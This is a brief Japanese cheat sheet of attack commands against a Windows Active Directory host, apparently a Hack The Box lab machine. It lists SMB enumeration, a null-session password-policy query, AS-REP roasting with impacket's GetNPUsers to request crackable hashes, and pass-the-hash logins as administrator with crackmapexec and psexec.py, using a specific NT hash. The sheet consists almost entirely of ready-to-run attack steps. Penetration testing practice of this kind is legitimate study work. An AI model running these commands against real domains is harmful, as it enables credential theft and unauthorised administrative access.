### smbclient  

    smbclient -L <ipaddr>

### passwordポリシーの取得

    crackmapexec smb 10.129.1.77 --pass-pol -u '' -p ''

### impacket

    python3 GetNPUsers.py -dc-ip 10.129.1.77 -request 'htb.local/' -format hashcat


### パスワードクラック



### ログイン

hashつかったログインが可能か確かめる
    crackmapexec smb 10.129.1.77 -u administrator -H aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6

psexec(hash)
aad3bからLMハッシュが始まる場合はblankなのでNTハッシュで埋める
    psexec.py -hashes 32693b11e6aa90eb43d32c72a07ceea6:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.129.1.77
